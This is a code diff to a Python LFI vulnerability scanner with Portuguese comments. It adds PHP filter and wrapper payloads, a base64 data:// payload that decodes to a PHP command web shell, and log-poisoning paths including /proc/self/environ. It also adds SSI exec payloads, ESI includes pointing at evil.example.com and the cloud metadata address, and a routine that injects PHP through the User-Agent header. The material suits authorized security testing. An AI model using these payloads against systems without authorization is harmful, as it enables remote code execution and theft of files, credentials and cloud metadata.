@@ -8,6 +8,7 @@ import requests
 import re
 import time
 import json
+import threading
 from datetime import datetime
 from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
 from bs4 import BeautifulSoup
@@ -42,6 +43,7 @@ class LFIScanner:
             self.session_pool.append(session)
             
         self.current_session_index = 0
+        self._session_lock = threading.Lock()  # protege acesso ao índice da pool
         self.vulnerable_points = []
         
         # RFI payloads para teste
@@ -92,10 +94,189 @@ class LFIScanner:
         self.logger = get_logger(__name__)
         self.console = Console()
 
+    # ------------------------------------------------------------------
+    # Técnicas modernas de exploração LFI
+    # ------------------------------------------------------------------
+
+    def get_php_filter_chain_payloads(self, base_path: str = "/etc/passwd") -> list[str]:
+        """
+        Gera payloads PHP Filter Chain para ler arquivos como base64.
+
+        O wrapper ``php://filter/convert.base64-encode/resource=`` permite ler
+        arquivos PHP sem executá-los (útil para ler código-fonte).
+
+        Args:
+            base_path: Arquivo alvo (padrão: /etc/passwd).
+
+        Returns:
+            Lista de payloads PHP filter chain.
+        """
+        payloads = [
+            # Leitura base64 básica
+            f"php://filter/convert.base64-encode/resource={base_path}",
+            f"php://filter/read=convert.base64-encode/resource={base_path}",
+            # Chain duplo para bypass de filtros simples
+            f"php://filter/convert.base64-encode|convert.base64-encode/resource={base_path}",
+            # ROT13 como alternativa
+            f"php://filter/read=string.rot13/resource={base_path}",
+            # Leitura via zip://
+            f"zip://shell.jpg%23shell.php",
+            # Leitura via phar://
+            f"phar://shell.phar/shell.php",
+            # Sem encoding (útil para arquivos de texto puro)
+            f"php://filter/resource={base_path}",
+            # Wrapper data:// para injeção de código (se allow_url_include=On)
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+            # Wrapper input:// — lê o body do POST como PHP
+            "php://input",
+        ]
+        # Adiciona variantes com caminhos Windows
+        win_path = base_path.replace("/", "\\")
+        payloads.append(f"php://filter/convert.base64-encode/resource={win_path}")
+        return payloads
+
+    def get_log_poisoning_paths(self) -> dict[str, list[str]]:
+        """
+        Retorna caminhos de logs para log poisoning.
+
+        Log poisoning combina LFI + injeção no User-Agent/Referrer
+        para executar código PHP arbitrário.
+
+        Returns:
+            Dict {descrição: [lista de caminhos]}
+        """
+        return {
+            "Apache Access Log": [
+                "/var/log/apache2/access.log",
+                "/var/log/apache/access.log",
+                "/usr/local/apache/log/access_log",
+                "/usr/local/apache2/log/access_log",
+                "/var/log/httpd/access_log",
+                "/etc/httpd/logs/access_log",
+            ],
+            "Apache Error Log": [
+                "/var/log/apache2/error.log",
+                "/var/log/apache/error.log",
+            ],
+            "Nginx Access Log": [
+                "/var/log/nginx/access.log",
+                "/var/log/nginx/error.log",
+            ],
+            "SSH Auth Log": [
+                "/var/log/auth.log",
+                "/var/log/secure",
+                "/var/log/sshd.log",
+            ],
+            "Mail Log": [
+                "/var/log/mail.log",
+                "/var/log/mail",
+                "/var/mail/root",
+            ],
+            "Proc/Self": [
+                "/proc/self/fd/0",
+                "/proc/self/fd/1",
+                "/proc/self/fd/2",
+                "/proc/self/environ",
+            ],
+            "PHP Session": [
+                "/tmp/sess_PHPSESSID",
+                "/var/lib/php/sessions/",
+                "/var/lib/php5/sess_",
+            ],
+        }
+
+    def get_ssi_payloads(self) -> list[str]:
+        """
+        Retorna payloads de Server-Side Include (SSI) injection.
+
+        SSI é executado em arquivos .shtml/.stm quando mod_include está ativo.
+
+        Returns:
+            Lista de payloads SSI.
+        """
+        return [
+            "<!--#exec cmd=\"id\"-->",
+            "<!--#exec cmd=\"whoami\"-->",
+            "<!--#exec cmd=\"cat /etc/passwd\"-->",
+            "<!--#include virtual=\"/etc/passwd\"-->",
+            "<!--#include file=\"/etc/passwd\"-->",
+            "<!--#printenv -->",
+            "<!--#config errmsg=\"error occurred\"-->",
+            '<!--#exec cmd="uname -a"-->',
+            '<!--#exec cmd="ls -la"-->',
+            # ESI injection
+            "<esi:include src=\"http://evil.example.com/esi\"/>",
+            "<esi:include src=\"http://169.254.169.254/latest/meta-data/\"/>",
+        ]
+
+    def test_log_poisoning(self, url: str, method: str, param: str,
+                            form_data: dict | None = None) -> list[dict]:
+        """
+        Testa log poisoning: injeta código PHP no User-Agent e depois
+        faz LFI nos arquivos de log para executá-lo.
+
+        Returns:
+            Lista de findings encontrados.
+        """
+        findings = []
+        session = self._get_session()
+        php_marker = "SpectraTest_LFI"
+        php_probe = f"<?php echo '{php_marker}'; ?>"
+
+        # 1) Envia requisição com User-Agent malicioso para envenenar logs
+        try:
+            poison_headers = {"User-Agent": php_probe}
+            session.get(url, headers=poison_headers, timeout=self.timeout, verify=False)
+        except Exception:
+            pass
+
+        # 2) Tenta LFI nos arquivos de log para executar o PHP injetado
+        log_paths_by_type = self.get_log_poisoning_paths()
+        for log_type, paths in log_paths_by_type.items():
+            for log_path in paths:
+                encoded_variants = self._apply_encoding_techniques(
+                    "../" * self.traversal_depth + log_path.lstrip("/")
+                )
+                for payload in encoded_variants[:3]:  # Limita variantes por log
+                    try:
+                        test_data = {param: payload}
+                        if method.lower() == "get":
+                            resp = session.get(
+                                url, params=test_data, timeout=self.timeout, verify=False
+                            )
+                        else:
+                            post_data = dict(form_data or {})
+                            post_data[param] = payload
+                            resp = session.post(
+                                url, data=post_data, timeout=self.timeout, verify=False
+                            )
+
+                        if php_marker in resp.text:
+                            findings.append({
+                                "Risco": "Crítico",
+                                "Tipo": "LFI + Log Poisoning (RCE)",
+                                "Detalhe": f"Parâmetro '{param}' em {url} — log {log_path} envenenado",
+                                "Recomendação": (
+                                    f"Payload '{payload}' executou PHP via {log_type}. "
+                                    "Desabilite allow_url_include e sanitize user input."
+                                ),
+                                "Payload": payload,
+                                "Log_Type": log_type,
+                                "Log_Path": log_path,
+                                "Evidence": php_marker,
+                                "Confidence": "High",
+                            })
+                            if findings[-1] not in self.vulnerable_points:
+                                self.vulnerable_points.append(findings[-1])
+                    except Exception:
+                        continue
+        return findings
+
     def _get_session(self):
-        """Obtém uma sessão do pool de forma round-robin"""
-        session = self.session_pool[self.current_session_index]
-        self.current_session_index = (self.current_session_index + 1) % len(self.session_pool)
+        """Obtém uma sessão do pool de forma round-robin com proteção contra race condition."""
+        with self._session_lock:
+            session = self.session_pool[self.current_session_index]
+            self.current_session_index = (self.current_session_index + 1) % len(self.session_pool)
         return session
 
     def _apply_encoding_techniques(self, payload):
